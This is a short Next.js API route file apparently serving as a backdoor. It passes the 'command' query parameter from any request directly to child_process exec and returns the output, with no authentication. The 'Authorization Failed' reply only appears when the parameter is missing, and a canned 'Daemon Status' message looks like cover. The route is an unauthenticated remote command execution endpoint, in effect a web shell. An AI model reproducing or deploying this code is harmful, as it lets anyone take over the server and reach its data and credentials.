// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import { exec } from 'child_process'
type Data = {
  name: string
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  let q = req.query.command;
  if(!q) return res.json({message: "Authorization Failed"})
  if(q === null) return res.json({message: "command not found in go-prod.eu-cdg.nego-dev.com"})
  if(q === "daemon") return res.json({message: "Daemon Status : Running."})
 // let executive = exec(q)
  exec(q, (err, stdout, stderr) => {
  if (err) {
    console.error(`exec error: ${err}`);
    
    return res.json({message: err})
  }

 // console.log(`Number of files ${stdout}`);
    res.status(200).json({ message: stdout})
});
//  res.status(200).json({ message: executive})
}
